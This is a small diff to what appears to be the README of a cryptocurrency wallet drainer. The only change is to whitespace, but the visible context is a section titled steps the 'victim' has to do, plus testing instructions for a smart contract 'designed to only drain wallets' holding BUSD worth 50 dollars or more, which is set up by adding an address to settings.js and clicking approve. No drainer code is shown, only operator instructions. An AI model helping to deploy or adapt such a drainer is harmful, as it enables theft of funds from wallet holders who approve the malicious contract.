@@ -75,7 +75,7 @@ Steps that the !!! victim !!! has to do
 
 TESTING (OPTIONAL)
 
-1.To test deposit busd on your wallet of at least 50 dollars or more the smart contract was designed to only drain wallets with value similiar to nft drainers
+1. To test deposit busd on your wallet of at least 50 dollars or more the smart contract was designed to only drain wallets with value similiar to nft drainers
 
 2. make sure you added your address to settings.js then click approve
 
